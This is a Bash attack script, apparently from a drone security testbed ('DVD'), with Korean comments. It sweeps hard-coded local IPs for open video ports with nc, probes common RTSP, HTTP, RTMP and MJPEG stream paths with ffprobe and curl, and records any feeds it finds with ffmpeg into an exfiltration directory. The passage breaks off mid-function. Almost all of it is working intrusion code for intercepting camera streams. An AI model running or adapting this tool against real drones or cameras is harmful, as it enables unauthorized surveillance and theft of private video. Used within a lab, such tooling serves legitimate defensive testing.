#!/bin/bash

# =============================================================================
# DVD Exfiltration Attack Module: Video Stream Exfiltration
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/exfiltration/video_stream_exfil.sh
# 목적: 드론 비디오 스트림 가로채기 및 영상 데이터 탈취
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Video Stream Exfiltration"
ATTACK_TYPE="EXFILTRATION"
TARGET_IPS=("192.168.13.1" "192.168.13.10" "192.168.13.50")
STREAM_PORTS=(554 8080 8000 8554 1935 1234)
CAPTURE_DURATION=120  # 2분
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/exfiltration/video_stream_exfil_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/video_stream_exfil_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/exfiltration/video_stream_exfil_report_$(date +%Y%m%d_%H%M%S).json"
EXFIL_DIR="/home/kali/MTD/MTD_full_testbed/exfiltrated_data/video_streams"

# 비디오 스트림 프로토콜
STREAM_PROTOCOLS=("rtsp" "http" "mjpeg" "rtp" "udp")

# 일반적인 드론 카메라 스트림 경로
STREAM_PATHS=(
    "/video"
    "/stream"
    "/cam"
    "/camera"
    "/live"
    "/mjpeg"
    "/video.mjpg"
    "/stream.mjpg"
    "/axis-cgi/mjpg/video.cgi"
    "/cgi-bin/video.cgi"
    "/video/mjpeg.cgi"
    "/api/v1/stream"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                    📹 DVD Video Stream Exfiltration 📹                  ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Drone Video Streams & Camera Feeds${NC}"
    echo -e "${BLUE}Method: Stream Interception & Recording${NC}"
    echo -e "${BLUE}Protocols: RTSP, HTTP, MJPEG, RTP${NC}"
    echo ""
}

# 비디오 스트림 탈취 환경 준비
prepare_video_exfiltration() {
    echo -e "${YELLOW}[+] Preparing video stream exfiltration environment...${NC}" | tee -a "$LOG_FILE"
    
    local session_dir="${EXFIL_DIR}/video_session_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$session_dir"
    
    # 하위 디렉토리 생성
    mkdir -p "$session_dir"/{rtsp_streams,http_streams,mjpeg_streams,raw_captures,thumbnails,metadata}
    
    echo -e "${GREEN}[✓] Video exfiltration environment ready: ${session_dir}${NC}" | tee -a "$LOG_FILE"
    echo "EXFIL_SETUP:VIDEO_SESSION_${session_dir}" >> "$IOC_FILE"
    
    # 전역 변수로 설정
    EXFIL_SESSION_DIR="$session_dir"
    return 0
}

# 비디오 스트림 탐지
discover_video_streams() {
    echo -e "${CYAN}[*] Discovering video streams on target networks...${NC}" | tee -a "$LOG_FILE"
    
    local discovered_streams=()
    
    for target_ip in "${TARGET_IPS[@]}"; do
        echo -e "${YELLOW}[*] Scanning ${target_ip} for video streams...${NC}" | tee -a "$LOG_FILE"
        
        for port in "${STREAM_PORTS[@]}"; do
            if timeout 3s nc -z "$target_ip" "$port" 2>/dev/null; then
                echo -e "${GREEN}[+] Open port found: ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
                
                # 포트별 프로토콜 확인
                case $port in
                    554)
                        discover_rtsp_streams "$target_ip" "$port"
                        ;;
                    8080|8000|8554)
                        discover_http_streams "$target_ip" "$port"
                        ;;
                    1935)
                        discover_rtmp_streams "$target_ip" "$port"
                        ;;
                    *)
                        discover_generic_streams "$target_ip" "$port"
                        ;;
                esac
                
                discovered_streams+=("${target_ip}:${port}")
                echo "EXFIL_TARGET:VIDEO_PORT_${target_ip}:${port}" >> "$IOC_FILE"
            fi
        done
    done
    
    if [ ${#discovered_streams[@]} -eq 0 ]; then
        echo -e "${RED}[!] No video streams discovered${NC}" | tee -a "$LOG_FILE"
        return 1
    else
        echo -e "${GREEN}[✓] Discovered ${#discovered_streams[@]} potential video sources${NC}" | tee -a "$LOG_FILE"
        return 0
    fi
}

# RTSP 스트림 탐지
discover_rtsp_streams() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing RTSP streams on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    # RTSP 기본 경로들 테스트
    local rtsp_paths=("/live" "/stream1" "/stream2" "/video" "/cam1" "/h264" "/mjpeg")
    
    for path in "${rtsp_paths[@]}"; do
        local rtsp_url="rtsp://${target_ip}:${port}${path}"
        
        # ffprobe로 스트림 정보 확인
        if command -v ffprobe &> /dev/null; then
            local stream_info=$(timeout 10s ffprobe -v quiet -print_format json -show_streams "$rtsp_url" 2>/dev/null)
            
            if [ -n "$stream_info" ] && echo "$stream_info" | grep -q '"codec_type": "video"'; then
                echo -e "${GREEN}[+] Valid RTSP stream found: ${rtsp_url}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_STREAM:RTSP_${rtsp_url}" >> "$IOC_FILE"
                
                # 스트림 메타데이터 추출
                extract_stream_metadata "$rtsp_url" "rtsp"
                
                # 스트림 캡처
                capture_rtsp_stream "$rtsp_url"
            fi
        else
            # ffprobe가 없으면 curl로 RTSP 헤더 확인
            local rtsp_response=$(timeout 5s curl -s -I "$rtsp_url" 2>/dev/null)
            if echo "$rtsp_response" | grep -qi "rtsp\|stream"; then
                echo -e "${GREEN}[+] Potential RTSP stream: ${rtsp_url}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_STREAM:RTSP_POTENTIAL_${rtsp_url}" >> "$IOC_FILE"
            fi
        fi
    done
}

# HTTP 스트림 탐지
discover_http_streams() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing HTTP streams on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    for path in "${STREAM_PATHS[@]}"; do
        local http_url="http://${target_ip}:${port}${path}"
        
        if command -v curl &> /dev/null; then
            local response=$(timeout 10s curl -s -I "$http_url" 2>/dev/null)
            local content_type=$(echo "$response" | grep -i "content-type" | cut -d: -f2 | tr -d ' \r\n')
            
            # 비디오 콘텐츠 타입 확인
            if echo "$content_type" | grep -qi "video\|image/jpeg\|multipart"; then
                echo -e "${GREEN}[+] Video stream found: ${http_url}${NC}" | tee -a "$LOG_FILE"
                echo -e "${CYAN}    Content-Type: ${content_type}${NC}" | tee -a "$LOG_FILE"
                
                echo "EXFIL_STREAM:HTTP_${http_url}" >> "$IOC_FILE"
                echo "EXFIL_STREAM:CONTENT_TYPE_${content_type//\//_}" >> "$IOC_FILE"
                
                # 스트림 타입별 처리
                if echo "$content_type" | grep -qi "mjpeg\|multipart"; then
                    capture_mjpeg_stream "$http_url"
                elif echo "$content_type" | grep -qi "video"; then
                    capture_http_video_stream "$http_url"
                fi
            fi
            
            # HTML 페이지에서 비디오 태그 확인
            local html_content=$(timeout 5s curl -s "$http_url" 2>/dev/null)
            if echo "$html_content" | grep -qi "<video\|<img.*mjpeg\|stream"; then
                echo -e "${YELLOW}[*] Potential video content in HTML: ${http_url}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_STREAM:HTTP_HTML_VIDEO_${http_url}" >> "$IOC_FILE"
                
                # HTML에서 실제 스트림 URL 추출
                extract_embedded_streams "$html_content" "$target_ip" "$port"
            fi
        fi
    done
}

# RTMP 스트림 탐지
discover_rtmp_streams() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing RTMP streams on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    local rtmp_paths=("/live" "/stream" "/app")
    
    for path in "${rtmp_paths[@]}"; do
        local rtmp_url="rtmp://${target_ip}:${port}${path}"
        
        if command -v ffprobe &> /dev/null; then
            if timeout 10s ffprobe -v quiet "$rtmp_url" 2>/dev/null; then
                echo -e "${GREEN}[+] RTMP stream found: ${rtmp_url}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_STREAM:RTMP_${rtmp_url}" >> "$IOC_FILE"
                
                capture_rtmp_stream "$rtmp_url"
            fi
        fi
    done
}

# 일반적인 스트림 탐지
discover_generic_streams() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing generic streams on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    # UDP 스트림 확인
    if command -v nc &> /dev/null; then
        # UDP 포트로 데이터 전송 시도
        echo "test" | timeout 3s nc -u "$target_ip" "$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${YELLOW}[*] UDP service responding on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_STREAM:UDP_POTENTIAL_${target_ip}:${port}" >> "$IOC_FILE"
        fi
    fi
}

# 임베디드 스트림 URL 추출
extract_embedded_streams() {
    local html_content=$1
    local target_ip=$2
    local port=$3
    
    # 정규표현식으로 비디오 URL 추출
    local video_urls=$(echo "$html_content" | grep -oP '(?<=src=")[^"]*\.(mp4|mjpg|jpg|avi|webm)')
    
    if [ -n "$video_urls" ]; then
        echo -e "${GREEN}[+] Found embedded video URLs${NC}" | tee -a "$LOG_FILE"
        
        echo "$video_urls" | while read -r video_url; do
            if [ -n "$video_url" ]; then
                # 절대 URL로 변환
                if [[ ! "$video_url" =~ ^https?:// ]]; then
                    video_url="http://${target_ip}:${port}${video_url}"
                fi
                
                echo -e "${CYAN}    Found: ${video_url}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_STREAM:EMBEDDED_${video_url}" >> "$IOC_FILE"
                
                # 임베디드 비디오 다운로드
                capture_embedded_video "$video_url"
            fi
        done
    fi
}

# 스트림 메타데이터 추출
extract_stream_metadata() {
    local stream_url=$1
    local protocol=$2
    
    echo -e "${CYAN}[*] Extracting metadata from ${stream_url}${NC}" | tee -a "$LOG_FILE"
    
    local metadata_file="${EXFIL_SESSION_DIR}/metadata/metadata_$(echo $stream_url | tr '/:' '_')_$(date +%H%M%S).json"
    
    if command -v ffprobe &> /dev/null; then
        # ffprobe로 상세 메타데이터 추출
        timeout 15s ffprobe -v quiet -print_format json -show_format -show_streams "$stream_url" > "$metadata_file" 2>/dev/null
        
        if [ -f "$metadata_file" ] && [ -s "$metadata_file" ]; then
            echo -e "${GREEN}[✓] Metadata extracted: ${metadata_file}${NC}" | tee -a "$LOG_FILE"
            
            # 중요 정보 추출
            local codec=$(jq -r '.streams[0].codec_name' "$metadata_file" 2>/dev/null || echo "unknown")
            local resolution=$(jq -r '.streams[0].width' "$metadata_file" 2>/dev/null || echo "unknown")x$(jq -r '.streams[0].height' "$metadata_file" 2>/dev/null || echo "unknown")
            local duration=$(jq -r '.format.duration' "$metadata_file" 2>/dev/null || echo "unknown")
            
            echo -e "${BLUE}    Codec: ${codec}, Resolution: ${resolution}, Duration: ${duration}s${NC}" | tee -a "$LOG_FILE"
            
            echo "EXFIL_METADATA:CODEC_${codec}" >> "$IOC_FILE"
            echo "EXFIL_METADATA:RESOLUTION_${resolution}" >> "$IOC_FILE"
            echo "EXFIL_METADATA:FILE_${metadata_file}" >> "$IOC_FILE"
        fi
    fi
}

# RTSP 스트림 캡처
capture_rtsp_stream() {
    local rtsp_url=$1
    
    echo -e "${YELLOW}[+] Capturing RTSP stream: ${rtsp_url}${NC}" | tee -a "$LOG_FILE"
    
    local output_file="${EXFIL_SESSION_DIR}/rtsp_streams/capture_$(echo $rtsp_url | tr '/:' '_')_$(date +%H%M%S).mp4"
    local thumbnail_file="${EXFIL_SESSION_DIR}/thumbnails/thumb_$(echo $rtsp_url | tr '/:' '_')_$(date +%H%M%S).jpg"
    
    if command -v ffmpeg &> /dev/null; then
        # RTSP 스트림 녹화
        timeout "$CAPTURE_DURATION"s ffmpeg -i "$rtsp_url" -c copy -t "$CAPTURE_DURATION" "$output_file" -y 2>/dev/null &
        local capture_pid=$!
        
        # 썸네일 생성
        timeout 10s ffmpeg -i "$rtsp_url" -vframes 1 -q:v 2 "$thumbnail_file" -y 2>/dev/null &
        
        echo -e "${CYAN}[*] Recording RTSP stream for ${CAPTURE_DURATION} seconds...${NC}" | tee -a "$LOG_FILE"
        
        # 진행률 표시
        local progress_duration=$((CAPTURE_DURATION > 60 ? 60 : CAPTURE_DURATION))
        for ((i=1; i<=progress_duration; i++)); do
            local progress=$((i * 100 / progress_duration))
            printf "\r${BLUE}[*] RTSP Capture: [%-20s] %d%% (%ds/${CAPTURE_DURATION}s)${NC}" \
                   "$(printf "%*s" $((progress/5)) | tr ' ' '=')" "$progress" "$i"
            sleep 1
        done
        echo ""
        
        wait $capture_pid 2>/dev/null
        
        # 캡처 결과 확인
        if [ -f "$output_file" ] && [ -s "$output_file" ]; then
            local file_size=$(stat -c%s "$output_file" 2>/dev/null || echo "0")
            echo -e "${GREEN}[✓] RTSP capture completed: ${output_file} (${file_size} bytes)${NC}" | tee -a "$LOG_FILE"
            
            echo "EXFIL_SUCCESS:RTSP_CAPTURE_${file_size}_BYTES" >> "$IOC_FILE"
            echo "EXFIL_FILE:RTSP_${output_file}" >> "$IOC_FILE"
        else
            echo -e "${RED}[!] RTSP capture failed${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_FAILED:RTSP_CAPTURE" >> "$IOC_FILE"
        fi
        
        # 썸네일 확인
        if [ -f "$thumbnail_file" ] && [ -s "$thumbnail_file" ]; then
            echo -e "${GREEN}[✓] Thumbnail created: ${thumbnail_file}${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_FILE:THUMBNAIL_${thumbnail_file}" >> "$IOC_FILE"
        fi
    fi
}

# MJPEG 스트림 캡처
capture_mjpeg_stream() {
    local mjpeg_url=$1
    
    echo -e "${YELLOW}[+] Capturing MJPEG stream: ${mjpeg_url}${NC}" | tee -a "$LOG_FILE"
    
    local output_dir="${EXFIL_SESSION_DIR}/mjpeg_streams/$(echo $mjpeg_url | tr '/:' '_')_$(date +%H%M%S)"
    mkdir -p "$output_dir"
    
    if command -v curl &> /dev/null; then
        # MJPEG 스트림을 개별 JPEG 이미지로 저장
        timeout "$CAPTURE_DURATION"s bash -c "
            frame_count=0
            while true; do
                frame_file='$output_dir/frame_\$(printf %06d \$frame_count).jpg'
                if curl -s --max-time 5 '$mjpeg_url' -o \"\$frame_file\"; then
                    if [ -s \"\$frame_file\" ]; then
                        frame_count=\$((frame_count + 1))
                        if [ \$frame_count -ge 100 ]; then  # 최대 100 프레임
                            break
                        fi
                    else
                        rm -f \"\$frame_file\"
                    fi
                else
                    break
                fi
                sleep 0.5
            done
            echo \"Captured \$frame_count frames\"
        " 2>/dev/null &
        
        local capture_pid=$!
        
        echo -e "${CYAN}[*] Capturing MJPEG frames for ${CAPTURE_DURATION} seconds...${NC}" | tee -a "$LOG_FILE"
        
        # 진행률 표시
        for ((i=1; i<=CAPTURE_DURATION/5; i++)); do
            local progress=$((i * 100 * 5 / CAPTURE_DURATION))
            printf "\r${BLUE}[*] MJPEG Capture: [%-20s] %d%% (%ds/${CAPTURE_DURATION}s)${NC}" \
                   "$(printf "%*s" $((progress/5)) | tr ' ' '=')" "$progress" "$((i*5))"
            sleep 5
        done
        echo ""
        
        wait $capture_pid 2>/dev/null
        
        # 캡처된 프레임 수 확인
        local frame_count=$(find "$output_dir" -name "*.jpg" | wc -l)
        if [ "$frame_count" -gt 0 ]; then
            echo -e "${GREEN}[✓] MJPEG capture completed: ${frame_count} frames${NC}" | tee -a "$LOG_FILE"
            
            echo "EXFIL_SUCCESS:MJPEG_${frame_count}_FRAMES" >> "$IOC_FILE"
            echo "EXFIL_DIR:MJPEG_${output_dir}" >> "$IOC_FILE"
            
            # 첫 프레임을 썸네일로 복사
            local first_frame=$(find "$output_dir" -name "*.jpg" | head -1)
            if [ -n "$first_frame" ]; then
                cp "$first_frame" "${EXFIL_SESSION_DIR}/thumbnails/mjpeg_thumb_$(date +%H%M%S).jpg"
            fi
        else
            echo -e "${RED}[!] MJPEG capture failed${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_FAILED:MJPEG_CAPTURE" >> "$IOC_FILE"
        fi
    fi
}

# HTTP 비디오 스트림 캡처
capture_http_video_stream() {
    local video_url=$1
    
    echo -e "${YELLOW}[+] Capturing HTTP video stream: ${video_url}${NC}" | tee -a "$LOG_FILE"
    
    local output_file="${EXFIL_SESSION_DIR}/http_streams/video_$(echo $video_url | tr '/:' '_')_$(date +%H%M%S).